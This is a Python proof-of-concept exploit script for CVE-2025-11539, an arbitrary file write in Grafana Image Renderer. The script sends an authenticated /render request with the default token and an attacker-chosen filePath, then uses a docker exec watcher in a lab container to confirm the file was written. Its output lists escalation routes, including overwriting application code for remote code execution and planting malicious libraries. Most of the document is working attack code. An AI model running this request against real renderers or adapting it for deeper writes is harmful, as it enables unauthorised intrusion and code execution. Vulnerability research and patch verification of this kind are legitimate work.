#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Grafana Image Renderer Arbitrary File Write via /render
# CVE            : CVE-2025-11539
# Vendor         : Grafana Labs
# Product        : Grafana Image Renderer
# Affected       : 1.0.0 through 4.0.16
# Type           : CWE-94 - Code Injection
# CVSS           : 9.9 (Critical)
# Platform       : Node.js / Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-10-09
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-11539 Vector 1: Arbitrary File Write via /render

Demonstrates that the Grafana Image Renderer accepts a user-controlled
filePath query parameter on the /render endpoint without any path
validation. An authenticated attacker can write a PNG screenshot to an
arbitrary location on the renderer's filesystem.

ATTACK CHAIN:
  1. Send authenticated GET /render with traversal filePath
  2. Renderer writes PNG screenshot to attacker-controlled path
  3. Verify file written via docker exec file watcher

PREREQUISITES:
  - Target running Grafana Image Renderer 1.0.0 through 4.0.16
  - Default auth token "-" (or known token)
  - Python 3.6+ (stdlib only, no external dependencies)

REFERENCES:
  - CVE-2025-11539
  - https://grafana.com/security/security-advisories/cve-2025-11539/
  - https://github.com/grafana/grafana-image-renderer/releases/tag/v4.0.17

Usage:
    python3 poc.py [renderer_host] [renderer_port] [container_name]
"""

import sys
import os
import time
import json
import subprocess
import urllib.request
import urllib.error
import uuid


# ============================================================
# Configuration
# ============================================================

DEFAULT_PORT = 8081
DEFAULT_CONTAINER = "cve-2025-11539-renderer"
AUTH_TOKEN = "-"  # Default auth token from default.json

# Grafana URL that the renderer navigates to for screenshot.
# The renderer must be able to reach this URL. We use the Grafana
# login page since it's always available and requires no auth.
GRAFANA_URL = "http://cve-2025-11539-grafana:3000/login"

# Arbitrary path to write the file to inside the renderer container.
# This is the key demonstration: the filePath parameter allows writing
# to ANY location, not just the expected temp directory.
TRAVERSAL_TARGET = "/tmp/cve-2025-11539-poc-{uid}.png"


def get_renderer_ip():
    """Auto-detect the renderer container IP on the lab network."""
    # Try common network names used by the lab compose
    for network in ["cve-2025-11539_lab-net", "lab-net"]:
        try:
            result = subprocess.run(
                ["docker", "inspect", DEFAULT_CONTAINER,
                 "--format", '{{(index .NetworkSettings.Networks "' + network + '").IPAddress}}'],
                capture_output=True, text=True, timeout=10
            )
            ip = result.stdout.strip()
            if ip and result.returncode == 0:
                return ip
        except (subprocess.SubprocessError, FileNotFoundError):
            pass
    return None


def check_file_in_container(container, filepath, timeout=15):
    """
    Watch for a file to appear in the container filesystem.

    Because the renderer deletes the file after sending the HTTP response,
    we use a polling loop to catch the file while it exists. We also copy
    it to an evidence path so it persists after cleanup.
    """
    evidence_path = filepath.replace(".png", ".evidence.png")
    # Run a watcher script inside the container
    watch_script = (
        f'for i in $(seq 1 {timeout * 20}); do '
        f'  if [ -f "{filepath}" ]; then '
        f'    echo "FILE_FOUND"; '
        f'    ls -la "{filepath}"; '
        f'    file "{filepath}"; '
        f'    cp "{filepath}" "{evidence_path}" 2>/dev/null; '
        f'    echo "EVIDENCE_SAVED:{evidence_path}"; '
        f'    exit 0; '
        f'  fi; '
        f'  sleep 0.05; '
        f'done; '
        f'echo "FILE_NOT_FOUND"; exit 1'
    )
    try:
        result = subprocess.run(
            ["docker", "exec", container, "bash", "-c", watch_script],
            capture_output=True, text=True, timeout=timeout + 5
        )
        return result.stdout.strip(), result.returncode == 0
    except subprocess.TimeoutExpired:
        return "Watcher timed out", False
    except (subprocess.SubprocessError, FileNotFoundError) as e:
        return f"Docker exec failed: {e}", False


def exploit(target_host, target_port, container_name=DEFAULT_CONTAINER):
    """
    Demonstrate CVE-2025-11539 arbitrary file write via /render endpoint.

    Steps:
    1. Start a file watcher inside the container (background subprocess)
    2. Send authenticated GET /render request with traversal filePath
    3. Verify the file was written to the attacker-controlled path
    """
    uid = uuid.uuid4().hex[:8]
    target_file = TRAVERSAL_TARGET.format(uid=uid)

    print(f"=" * 70)
    print(f"  CVE-2025-11539 PoC — Arbitrary File Write via /render")
    print(f"=" * 70)
    print(f"  Target:     {target_host}:{target_port}")
    print(f"  Container:  {container_name}")
    print(f"  Auth Token: {AUTH_TOKEN}")
    print(f"  Write Path: {target_file}")
    print(f"  URL:        {GRAFANA_URL}")
    print(f"=" * 70)
    print()

    # ── Step 1: Start file watcher in background ──────────────────────
    print("[*] Step 1: Starting file watcher inside container...")
    import threading

    watcher_result = {"output": None, "success": False}

    def run_watcher():
        output, success = check_file_in_container(container_name, target_file, timeout=30)
        watcher_result["output"] = output
        watcher_result["success"] = success

    watcher_thread = threading.Thread(target=run_watcher, daemon=True)
    watcher_thread.start()
    time.sleep(0.5)  # Give the watcher a moment to start

    # ── Step 2: Send the exploit request ──────────────────────────────
    print("[*] Step 2: Sending exploit request to /render endpoint...")
    print(f"    GET /render?url={GRAFANA_URL}&filePath={target_file}&width=100&height=100&timeout=30")
    print(f"    X-Auth-Token: {AUTH_TOKEN}")
    print()

    render_url = (
        f"http://{target_host}:{target_port}/render"
        f"?url={urllib.request.quote(GRAFANA_URL, safe='/:@')}"
        f"&filePath={urllib.request.quote(target_file, safe='')}"
        f"&width=100&height=100&timeout=30"
    )

    req = urllib.request.Request(render_url)
    req.add_header("X-Auth-Token", AUTH_TOKEN)

    try:
        resp = urllib.request.urlopen(req, timeout=60)
        status = resp.status
        content_type = resp.headers.get("Content-Type", "unknown")
        body = resp.read()
        print(f"[+] Response: HTTP {status}, Content-Type: {content_type}, Body size: {len(body)} bytes")
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error: {e.code} {e.reason}")
        body = e.read()
        print(f"    Response body: {body.decode('utf-8', errors='replace')[:500]}")
        print()
        print("[!] EXPLOIT FAILED — HTTP error from renderer")
        return False
    except urllib.error.URLError as e:
        print(f"[-] Connection failed: {e.reason}")
        print("[!] EXPLOIT FAILED — Cannot reach renderer")
        return False

    # ── Step 3: Verify file was written ───────────────────────────────
    print()
    print("[*] Step 3: Waiting for file watcher to detect the written file...")
    watcher_thread.join(timeout=35)

    if watcher_result["success"]:
        print()
        print("[+] ═══════════════════════════════════════════════════════════")
        print("[+]  VULNERABILITY CONFIRMED — Arbitrary File Write Succeeded!")
        print("[+] ═══════════════════════════════════════════════════════════")
        print()
        for line in watcher_result["output"].split("\n"):
            print(f"    {line}")
        print()
        print(f"[+] The renderer wrote a PNG screenshot to {target_file}")
        print(f"[+] This path was supplied by the attacker via the filePath parameter")
        print(f"[+] No path validation was performed — ANY writable path is reachable")
        print()
        print("[+] Impact: An attacker can write files to arbitrary locations")
        print("[+]         on the renderer's filesystem, enabling:")
        print("[+]           - Overwriting application code for RCE on restart")
        print("[+]           - Overwriting config files")
        print("[+]           - Writing malicious shared libraries loaded by Chromium")
        return True
    else:
        print()
        print(f"[-] File watcher output: {watcher_result['output']}")
        print("[!] EXPLOIT FAILED — File was not detected at the target path")
        print("[!] This may be due to:")
        print("[!]   - The file was written and cleaned up before the watcher started")
        print("[!]   - The render failed (check container logs)")
        return False


if __name__ == "__main__":
    # Parse arguments
    if len(sys.argv) > 1 and sys.argv[1] in ("-h", "--help"):
        print(__doc__)
        sys.exit(0)

    target_host = sys.argv[1] if len(sys.argv) > 1 else get_renderer_ip()
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    container = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_CONTAINER

    if not target_host:
        print("[-] Could not auto-detect renderer IP. Provide it as an argument.")
        print(f"    Usage: {sys.argv[0]} <renderer_host> [port] [container_name]")
        sys.exit(1)

    print(f"[*] Auto-detected renderer IP: {target_host}")
    print()

    success = exploit(target_host, target_port, container)
    sys.exit(0 if success else 1)
